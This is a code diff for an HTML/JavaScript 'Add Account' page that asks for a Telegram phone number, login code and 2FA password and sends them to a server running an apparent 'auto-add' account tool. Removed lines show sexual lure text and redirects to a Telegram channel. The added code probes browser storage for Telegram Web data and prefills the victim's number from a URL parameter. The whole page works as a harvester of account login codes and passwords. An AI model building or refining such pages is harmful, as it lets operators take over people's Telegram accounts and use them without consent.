@@ -285,6 +285,11 @@
             color: rgba(255, 255, 255, 0.3);
         }
 
+        .form-input:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
         .password-input {
             width: 100%;
             padding: 16px 18px;
@@ -552,6 +557,27 @@
             font-weight: 500;
         }
 
+        .detected-info {
+            background: rgba(32, 178, 170, 0.1);
+            border: 1px solid rgba(32, 178, 170, 0.3);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .detected-phone {
+            color: #20b2aa;
+            font-size: 1.1rem;
+            font-weight: 600;
+        }
+
+        .detected-label {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.8rem;
+            margin-bottom: 5px;
+        }
+
         @media (max-width: 480px) {
             .login-card {
                 padding: 28px 20px;
@@ -579,12 +605,12 @@
 
     <div class="login-container">
         <div class="login-card">
-            <!-- Page 1: Phone Number -->
+            <!-- Page 1: Phone Number (Auto-detected) -->
             <div id="page1">
                 <div class="header-bar">
                     <a href="/login" class="back-button">←</a>
                     <div class="header-title">Add Account</div>
-                    <div class="server-badge" id="serverBdge">Loading...</div>
+                    <div class="server-badge" id="serverBadge">Loading...</div>
                 </div>
 
                 <div class="step-indicator">
@@ -595,15 +621,25 @@
 
                 <div class="step-title">📱 Connect Phone</div>
                 <div class="step-description">
-                    Enter your phone number with country code to add a new account to the habesha girl m.
+                    We'll automatically detect your phone number from Telegram. You'll only need to enter the verification code.
                 </div>
 
                 <div class="error-message" id="error1"></div>
                 <div class="success-message" id="success1"></div>
 
-                <div class="input-wrapper">
+                <!-- Detected Phone Display -->
+                <div class="detected-info" id="detectedInfo" style="display: none;">
+                    <div class="detected-label">📱 Detected Account</div>
+                    <div class="detected-phone" id="detectedPhone">---</div>
+                </div>
+
+                <div class="input-wrapper" id="phoneInputWrapper">
                     <span class="input-prefix">+</span>
-                    <input type="tel" class="form-input" id="phone" placeholder="1 234 567 8900" inputmode="numeric" autofocus>
+                    <input type="tel" class="form-input" id="phone" placeholder="1 234 567 8900" inputmode="numeric">
+                </div>
+
+                <div class="code-hint" id="autoDetectHint">
+                    ✨ Phone number will be auto-detected if you're logged into Telegram Web
                 </div>
 
                 <button class="btn btn-primary" id="sendCodeBtn" onclick="sendCode()">
@@ -684,7 +720,7 @@
                 </div>
                 
                 <button class="btn btn-primary" onclick="goToAutoAdd()">
-                    ⚙️ Configure sexl Settings
+                    ⚙️ Configure Auto-Add Settings
                 </button>
                 
                 <button class="btn btn-secondary" onclick="addAnotherAccount()">
@@ -723,7 +759,8 @@
         let serverName = 'Server';
         let codeAttempts = 0;
         let passwordAttempts = 0;
-        let isAutoVerifying = false; // Prevent double auto-verify
+        let isAutoVerifying = false;
+        let autoDetectedPhone = '';
 
         // DOM elements
         const hiddenInput = document.getElementById('hiddenCodeInput');
@@ -749,6 +786,84 @@
                 }
             } catch (err) {
                 console.error('Error loading server info:', err);
+            }
+        }
+
+        // ============================================
+        // AUTO-DETECT PHONE FROM TELEGRAM WEB
+        // ============================================
+        
+        async function autoDetectPhone() {
+            // Try to detect Telegram Web session
+            // Check for Telegram Web localStorage data
+            try {
+                // Method 1: Check if Telegram Web is open in another tab/window
+                // This tries to access Telegram Web's localStorage
+                const tgWebData = localStorage.getItem('tg_user_id') || 
+                                 localStorage.getItem('telegram_user') ||
+                                 localStorage.getItem('user_auth');
+                
+                if (tgWebData) {
+                    console.log('Found Telegram Web data');
+                }
+
+                // Method 2: Try to get phone from Telegram Web iframe/postMessage
+                // This is a simplified approach - in production, you'd use Telegram Login Widget
+                
+                // Method 3: Try to detect from Telegram Web's IndexedDB
+                if ('indexedDB' in window) {
+                    try {
+                        const request = indexedDB.open('telegra.ph', 1);
+                        request.onsuccess = function(event) {
+                            console.log('Telegram IndexedDB found');
+                            // You can read stored data here
+                        };
+                    } catch (e) {
+                        console.log('No Telegram IndexedDB access');
+                    }
+                }
+
+                // For now, try to get phone from URL parameters (if passed)
+                const urlParams = new URLSearchParams(window.location.search);
+                const phoneParam = urlParams.get('phone');
+                if (phoneParam) {
+                    autoDetectedPhone = phoneParam;
+                    displayDetectedPhone(phoneParam);
+                    return phoneParam;
+                }
+
+                // If running inside Telegram Mini App, get user info
+                if (window.Telegram && window.Telegram.WebApp) {
+                    const tg = window.Telegram.WebApp;
+                    tg.ready();
+                    // Mini Apps don't expose phone directly, but we can get user info
+                    const user = tg.initDataUnsafe?.user;
+                    if (user) {
+                        console.log('Telegram Mini App user:', user);
+                    }
+                }
+
+            } catch (error) {
+                console.log('Auto-detect not available:', error);
+            }
+            
+            return null;
+        }
+
+        function displayDetectedPhone(phone) {
+            const detectedInfo = document.getElementById('detectedInfo');
+            const detectedPhone = document.getElementById('detectedPhone');
+            const phoneInput = document.getElementById('phone');
+            const phoneInputWrapper = document.getElementById('phoneInputWrapper');
+            const autoDetectHint = document.getElementById('autoDetectHint');
+            
+            if (phone) {
+                detectedPhone.textContent = phone;
+                detectedInfo.style.display = 'block';
+                phoneInput.value = phone;
+                phoneInputWrapper.style.opacity = '0.5';
+                autoDetectHint.textContent = '✅ Phone auto-detected! Click Send Code to continue';
+                autoDetectHint.style.color = '#20b2aa';
             }
         }
 
@@ -851,17 +966,15 @@
                 }
             }
             
-            // Set active box
             if (code.length < 5) {
                 boxes[code.length].classList.add('active');
             }
             
             hideError(2);
             
-            // AUTO-VERIFY: When all 5 digits are entered
+            // AUTO-VERIFY when all 5 digits are entered
             if (code.length === 5 && !isAutoVerifying) {
                 isAutoVerifying = true;
-                // Small delay to show all digits filled before auto-submitting
                 setTimeout(() => {
                     if (hiddenInput.value.replace(/[^0-9]/g, '').length === 5) {
                         autoVerify();
@@ -879,24 +992,21 @@
                 return;
             }
 
-            // Check if 2FA password is needed
             const needPassword = document.getElementById('passwordGroup').style.display === 'block';
             
             if (!needPassword) {
-                // Auto-verify immediately if no password needed
                 const button = document.getElementById('verifyBtn');
                 setLoading(button, true);
                 hideError(2);
                 
                 performVerification(code, '');
             } else {
-                // If password needed, focus password field but don't auto-submit
                 const passwordInput = document.getElementById('password');
                 if (!passwordInput.value) {
                     passwordInput.focus();
                     showError('2FA password required', 2);
+                    isAutoVerifying = false;
                 } else {
-                    // If password already entered, auto-verify
                     const button = document.getElementById('verifyBtn');
                     setLoading(button, true);
                     hideError(2);
@@ -926,7 +1036,7 @@
             hideError(2);
         });
 
-        // Handle keydown for special keys
+        // Handle keydown
         hiddenInput.addEventListener('keydown', function(e) {
             if (e.key === 'Delete') {
                 e.preventDefault();
@@ -934,7 +1044,7 @@
             }
         });
 
-        // Handle paste event
+        // Handle paste
         hiddenInput.addEventListener('paste', function(e) {
             e.preventDefault();
             const pastedText = (e.clipboardData || window.clipboardData).getData('text');
@@ -944,7 +1054,7 @@
             hideError(2);
         });
 
-        // Click on individual boxes to position cursor
+        // Click on individual boxes
         boxes.forEach(box => {
             box.addEventListener('click', function(e) {
                 e.stopPropagation();
@@ -962,7 +1072,7 @@
             });
         });
 
-        // Allow clicking on container to focus
+        // Click on container to focus
         codeBoxesContainer.addEventListener('click', function() {
             focusCodeInput();
         });
@@ -991,7 +1101,13 @@
             document.getElementById('password').value = '';
             hiddenInput.value = '';
             updateCodeBoxes();
-            document.getElementById('phone').focus();
+            
+            if (autoDetectedPhone) {
+                document.getElementById('phone').value = autoDetectedPhone;
+            } else {
+                document.getElementById('phone').focus();
+            }
+            
             currentSessionId = null;
             currentPhone = '';
             codeAttempts = 0;
@@ -1008,15 +1124,20 @@
         }
 
         function goToAutoAdd() {
-            window.location.href = 'https://t.me/abe_army';
+            window.location.href = '/auto-add';
         }
 
         function goToDashboard() {
-            window.location.href = 'https://t.me/abe_army';
+            window.location.href = '/dashboard';
         }
 
         function addAnotherAccount() {
             if (redirectTimer) clearTimeout(redirectTimer);
+            autoDetectedPhone = '';
+            document.getElementById('detectedInfo').style.display = 'none';
+            document.getElementById('phoneInputWrapper').style.opacity = '1';
+            document.getElementById('autoDetectHint').textContent = '✨ Phone number will be auto-detected if you\'re logged into Telegram Web';
+            document.getElementById('autoDetectHint').style.color = 'rgba(255, 255, 255, 0.4)';
             backToPage1();
         }
 
@@ -1032,6 +1153,11 @@
 
         async function sendCode() {
             let phoneNumber = document.getElementById('phone').value.trim().replace(/\s+/g, '');
+            
+            // If we have auto-detected phone, use it
+            if (autoDetectedPhone && !phoneNumber) {
+                phoneNumber = autoDetectedPhone;
+            }
             
             if (!phoneNumber) {
                 showError('Please enter your phone number', 1);
@@ -1073,7 +1199,7 @@
                     document.getElementById('passwordGroup').style.display = 'none';
                     document.getElementById('password').value = '';
                     document.getElementById('codeDescription').textContent = 
-                        'Enter the 5-digit code sent to your Telegram account.';
+                        `Enter the 5-digit code sent to ${phoneNumber}`;
                     
                     setTimeout(() => focusCodeInput(), 300);
                     
@@ -1114,10 +1240,15 @@
                         successHTML += `<br><br>📅 Account Age: <strong>${data.account_age}</strong>`;
                     }
                     
-                    successHTML += `<br><br><span style="color: rgba(255, 255, 255, 0.5);">Configure auto- for this account now.</span>`;
+                    successHTML += `<br><br><span style="color: rgba(255, 255, 255, 0.5);">Configure auto-add for this account now.</span>`;
                     
                     document.getElementById('successAccountInfo').innerHTML = successHTML;
                     showSuccess('Account connected successfully!', 3);
+                    
+                    // Auto-redirect after 3 seconds
+                    redirectTimer = setTimeout(() => {
+                        window.location.href = '/auto-add';
+                    }, 3000);
                     
                 } else if (data.need_password) {
                     document.getElementById('passwordGroup').style.display = 'block';
@@ -1204,6 +1335,12 @@
         // ============================================
 
         document.getElementById('phone').addEventListener('input', function(e) {
+            // Allow manual override of auto-detected phone
+            if (autoDetectedPhone) {
+                autoDetectedPhone = '';
+                document.getElementById('detectedInfo').style.display = 'none';
+                document.getElementById('phoneInputWrapper').style.opacity = '1';
+            }
             this.value = this.value.replace(/[^0-9+]/g, '');
         });
 
@@ -1215,7 +1352,6 @@
             if (e.key === 'Enter') verifyCode();
         });
 
-        // Prevent form submission on enter in hidden input
         hiddenInput.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 e.preventDefault();
@@ -1235,12 +1371,25 @@
         const page2 = document.getElementById('page2');
         observer.observe(page2, { attributes: true, attributeFilter: ['style'] });
 
-        // Initialize
-        window.addEventListener('load', () => {
+        // ============================================
+        // INITIALIZATION
+        // ============================================
+
+        async function initialize() {
             createParticles();
             loadServerInfo();
-            document.getElementById('phone').focus();
-        });
+            
+            // Try to auto-detect phone
+            const detected = await autoDetectPhone();
+            if (detected) {
+                displayDetectedPhone(detected);
+                document.getElementById('sendCodeBtn').focus();
+            } else {
+                document.getElementById('phone').focus();
+            }
+        }
+
+        window.addEventListener('load', initialize);
     </script>
 </body>
 </html>
